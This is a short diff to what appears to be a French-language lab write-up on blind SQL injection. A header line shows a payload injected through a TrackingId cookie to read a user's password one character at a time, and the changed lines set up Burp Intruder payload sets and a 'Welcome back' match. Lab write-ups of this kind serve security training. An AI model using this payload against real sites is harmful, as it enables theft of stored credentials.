@@ -135,8 +135,8 @@ TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,§1§,1)+FROM+users+WHERE+usernam
 3) Puis 2 payloads : 
 
 ```
-- Payload set 1, type number -> sequential 1 to 20
-- Payload set 2, type brute forcer -> abcdefghijklmnopqrstuvwxyz0123456789
+- Payload set 1-1, type number -> sequential 1 to 20
+- Payload set 2-a, type brute forcer -> abcdefghijklmnopqrstuvwxyz0123456789
 ```
 
-4) Et enfin allez dans "Options > Grep - Match", puis "Add > Welcome back"
+4) Et enfin allez dans "Options > Grep - Match", puis "Add > Welcome back!"
